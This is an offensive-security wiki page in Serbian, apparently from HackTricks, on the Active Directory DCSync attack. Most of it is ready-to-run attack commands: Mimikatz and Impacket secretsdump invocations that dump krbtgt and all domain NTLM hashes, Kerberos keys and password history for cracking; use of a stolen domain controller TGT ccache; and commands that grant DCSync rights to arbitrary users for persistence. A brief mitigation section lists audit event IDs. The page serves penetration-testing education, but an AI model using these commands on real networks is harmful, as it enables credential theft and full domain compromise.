# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Dozvola **DCSync** podrazumeva posedovanje sledećih dozvola nad samim domenom: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** i **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Važne napomene o DCSync:**

- **DCSync napad simulira ponašanje Domain Controller-a i zahteva od drugih Domain Controller-a replikaciju informacija** koristeći Directory Replication Service Remote Protocol (MS-DRSR). Pošto je MS-DRSR važeća i neophodna funkcija Active Directory-ja, ne može se isključiti niti onemogućiti.
- Podrazumevano, samo grupe **Domain Admins, Enterprise Admins, Administrators i Domain Controllers** imaju potrebne privilegije.
- U praksi, **potpuni DCSync** zahteva **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** nad kontekstom imenovanja domena. `DS-Replication-Get-Changes-In-Filtered-Set` se obično delegira zajedno sa njima, ali je samostalno relevantniji za sinhronizaciju **poverljivih / RODC-filtered atributa** (na primer, tajni podaci u legacy LAPS stilu) nego za potpuno preuzimanje krbtgt podataka.<sup>[[2]](#references)</sup>
- Ako su lozinke nekih naloga sačuvane korišćenjem reverzibilne enkripcije, Mimikatz ima opciju za prikaz lozinke u čistom tekstu.

### Enumeracija

Proverite ko ima ove dozvole koristeći `powerview`:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Ako želite da se fokusirate na **non-default principals** sa DCSync pravima, izuzmite ugrađene grupe sa mogućnošću replikacije i pregledajte samo neočekivane trustees:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Lokalna eksploatacija
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Udaljena eksploatacija
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Praktični primeri po opsegu:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync pomoću zarobljenog DC machine TGT-a (ccache)

U scenarijima sa unconstrained-delegation export-mode-om, možete zarobiti Domain Controller machine TGT (npr. `DC1$@DOMAIN` za `krbtgt@DOMAIN`). Zatim možete koristiti taj ccache za autentifikaciju kao DC i izvršiti DCSync bez lozinke.<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Operativne napomene:

- **Impacket-ova Kerberos putanja prvo pristupa SMB-u** pre poziva DRSUAPI. Ako okruženje primenjuje **SPN target name validation**, kompletan dump može da ne uspe uz poruku `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- U tom slučaju prvo zatražite **`cifs/<dc>`** service ticket za ciljni DC ili koristite **`-just-dc-user`** za nalog koji vam je odmah potreban.
- Kada imate samo niže privilegije za replikaciju, LDAP/DirSync-style sinhronizacija i dalje može da otkrije **confidential** ili **RODC-filtered** atribute (na primer stari `ms-Mcs-AdmPwd`), bez potpune krbtgt replikacije.<sup>[[2]](#references)</sup>

`-just-dc` generiše 3 datoteke:

- jednu sa **NTLM hash-evima**
- jednu sa **Kerberos ključevima**
- jednu sa lozinkama u čistom tekstu iz NTDS-a za sve naloge kod kojih je omogućeno [**reverzibilno šifrovanje**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Korisnike sa omogućenim reverzibilnim šifrovanjem možete dobiti pomoću

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Ako ste domain admin, ove dozvole možete dodeliti bilo kom korisniku pomoću `powerview`:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linux operateri mogu da urade isto pomoću `bloodyAD`:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Zatim možete **proveriti da li su korisniku ispravno dodeljene** 3 privilegije tako što ćete ih potražiti u izlazu komande (trebalo bi da vidite nazive privilegija u polju „ObjectType“):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Ublažavanje

- Security Event ID 4662 (Audit Policy for object must be enabled) – Operacija je izvršena nad objektom<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Audit Policy for object must be enabled) – Objekat directory service-a je izmenjen
- Security Event ID 4670 (Audit Policy for object must be enabled) – Dozvole nad objektom su promenjene
- AD ACL Scanner - Kreirajte i uporedite izveštaje o ACL-ovima. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Reference

- [1] [Impacket ChangeLog](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Leveraging Replication Get-Changes and Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Dump Password Hashes from Domain Controller](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
